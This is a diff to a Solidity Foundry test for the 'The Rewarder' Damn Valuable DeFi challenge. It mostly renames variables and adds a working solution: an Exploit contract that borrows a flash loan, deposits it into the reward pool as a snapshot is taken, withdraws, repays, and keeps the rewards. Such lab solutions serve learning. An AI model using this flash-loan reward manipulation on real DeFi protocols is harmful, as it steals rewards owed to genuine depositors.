@@ -16,16 +16,21 @@ contract TheRewarder is Test {
 
     Utilities internal utils;
     FlashLoanerPool internal flashLoanerPool;
-    TheRewarderPool internal theRewarderPool;
-    DamnValuableToken internal dvt;
+    TheRewarderPool internal rewarderPool;
+    RewardToken internal rewardToken;
+    AccountingToken internal accountingToken;
+    DamnValuableToken internal liquidityToken;
     address payable[] internal users;
-    address payable internal attacker;
+    address[4] internal depositors;
+    address payable internal player;
     address payable internal alice;
     address payable internal bob;
     address payable internal charlie;
     address payable internal david;
 
     function setUp() public {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+
         utils = new Utilities();
         users = utils.createUsers(5);
 
@@ -33,53 +38,72 @@ contract TheRewarder is Test {
         bob = users[1];
         charlie = users[2];
         david = users[3];
-        attacker = users[4];
+        player = users[4];
+
+        depositors = [alice, bob, charlie, david];
 
         vm.label(alice, "Alice");
         vm.label(bob, "Bob");
         vm.label(charlie, "Charlie");
         vm.label(david, "David");
-        vm.label(attacker, "Attacker");
+        vm.label(player, "Player");
 
-        dvt = new DamnValuableToken();
-        vm.label(address(dvt), "DVT");
 
-        flashLoanerPool = new FlashLoanerPool(address(dvt));
+        liquidityToken = new DamnValuableToken();
+        vm.label(address(liquidityToken), "Liquidity Token");
+
+        flashLoanerPool = new FlashLoanerPool(address(liquidityToken));
         vm.label(address(flashLoanerPool), "Flash Loaner Pool");
 
         // Set initial token balance of the pool offering flash loans
-        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);
+        liquidityToken.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);
 
-        theRewarderPool = new TheRewarderPool(address(dvt));
+        rewarderPool = new TheRewarderPool(address(liquidityToken));
+        rewardToken = rewarderPool.rewardToken();
+        accountingToken = rewarderPool.accountingToken();
 
-        // Alice, Bob, Charlie and David deposit 100 tokens each
-        for (uint8 i; i < 4; i++) {
-            dvt.transfer(users[i], USER_DEPOSIT);
+        // Check roles in accounting token
+        assertEq(accountingToken.owner(), address(rewarderPool));
+        uint256 minterRole = accountingToken.MINTER_ROLE();
+        uint256 snapshotRole = accountingToken.SNAPSHOT_ROLE();
+        uint256 burnerRole = accountingToken.BURNER_ROLE();
+        assert(accountingToken.hasAllRoles(address(rewarderPool), minterRole | snapshotRole | burnerRole) == true);
+
+
+       // Alice, Bob, Charlie and David deposit tokens
+        for (uint8 i; i < depositors.length; i++) {
+            liquidityToken.transfer(users[i], USER_DEPOSIT);
             vm.startPrank(users[i]);
-            dvt.approve(address(theRewarderPool), USER_DEPOSIT);
-            theRewarderPool.deposit(USER_DEPOSIT);
-            assertEq(theRewarderPool.accToken().balanceOf(users[i]), USER_DEPOSIT);
+            liquidityToken.approve(address(rewarderPool), USER_DEPOSIT);
+            rewarderPool.deposit(USER_DEPOSIT);
+            assertEq(accountingToken.balanceOf(users[i]), USER_DEPOSIT);
             vm.stopPrank();
         }
 
-        assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
-        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);
+        assertEq(accountingToken.totalSupply(), USER_DEPOSIT * depositors.length);
+        assertEq(rewardToken.totalSupply(), 0);
 
         // Advance time 5 days so that depositors can get rewards
         vm.warp(block.timestamp + 5 days); // 5 days
 
-        for (uint8 i; i < 4; i++) {
+        // Each depositor gets reward tokens
+        uint256 rewardsInRound = rewarderPool.REWARDS();
+        for (uint8 i; i < depositors.length; i++) {
             vm.prank(users[i]);
-            theRewarderPool.distributeRewards();
+            rewarderPool.distributeRewards();
             assertEq(
-                theRewarderPool.rewardToken().balanceOf(users[i]),
-                25e18 // Each depositor gets 25 reward tokens
+                rewardToken.balanceOf(users[i]),
+                rewardsInRound/(depositors.length) // Each depositor gets 25 reward tokens
             );
         }
 
-        assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
-        assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
-        assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far
+        assertEq(rewardToken.totalSupply(), rewardsInRound);
+
+        // Player starts with zero DVT tokens in balance
+        assertEq(liquidityToken.balanceOf(player), 0); 
+
+        // Two rounds should have occurred so far
+        assertEq(rewarderPool.roundNumber(), 2); 
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
@@ -89,6 +113,15 @@ contract TheRewarder is Test {
          * EXPLOIT START *
          */
 
+         // Advance time 5 days so that depositors can get rewards. Can also advance it after depositing. Both are valid
+        vm.warp(block.timestamp + 5 days); // 5 days
+
+        vm.startPrank(player);
+
+        Exploit exploit = new Exploit(rewarderPool, flashLoanerPool, liquidityToken, rewardToken);
+        exploit.flashLoan(TOKENS_IN_LENDER_POOL);
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -97,24 +130,63 @@ contract TheRewarder is Test {
     }
 
     function validation() internal {
-        assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
-        for (uint8 i; i < 4; i++) {
-            // Users should get negligible rewards this round
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+        // Only one round should have taken place
+        assertEq(rewarderPool.roundNumber(), 3); 
+
+        // Users should get negligible rewards this round
+        for (uint8 i; i < depositors.length; i++) {
             vm.prank(users[i]);
-            theRewarderPool.distributeRewards();
-            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
-            uint256 delta = rewardPerUser - 25e18;
+            rewarderPool.distributeRewards();
+            uint256 rewardPerUser = rewardToken.balanceOf(users[i]);
+            uint256 delta = rewardPerUser - (rewarderPool.REWARDS()/(depositors.length));
             assertLt(delta, 1e16);
         }
+
         // Rewards must have been issued to the attacker account
-        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
-        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);
+        assertGt(rewardToken.totalSupply(), rewarderPool.REWARDS());
+        uint256 playerRewards = rewardToken.balanceOf(player);
+        assertGt(playerRewards, 0);
 
         // The amount of rewards earned should be really close to 100 tokens
-        uint256 deltaAttacker = 100e18 - rewardAttacker;
+        uint256 deltaAttacker = rewarderPool.REWARDS() - playerRewards;
         assertLt(deltaAttacker, 1e17);
 
-        // Attacker finishes with zero DVT tokens in balance
-        assertEq(dvt.balanceOf(attacker), 0);
+        /// Balance of DVT tokens in player and lending pool hasn't changed
+        assertEq(liquidityToken.balanceOf(player), 0);
+        assertEq(
+            liquidityToken.balanceOf(address(flashLoanerPool)),
+        TOKENS_IN_LENDER_POOL);
+    }
+}
+
+contract Exploit{
+
+    TheRewarderPool rewardPool;
+    FlashLoanerPool flashLoanPool;
+    DamnValuableToken liquidityToken;
+    RewardToken rewardToken;
+    address owner;
+
+    constructor(TheRewarderPool _rewardPool, FlashLoanerPool _flashLoanPool, DamnValuableToken _liquidityToken, RewardToken _rewardToken) {
+        owner = msg.sender;
+        rewardPool = _rewardPool;
+        flashLoanPool = _flashLoanPool;
+        liquidityToken = _liquidityToken;
+        rewardToken = _rewardToken;
+    }
+
+    function flashLoan(uint256 amount) external {
+        flashLoanPool.flashLoan(amount);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        liquidityToken.approve(address(rewardPool), amount);
+        rewardPool.deposit(amount);
+        rewardPool.withdraw(amount);
+
+        liquidityToken.transfer(address(flashLoanPool), amount);
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
     }
 }
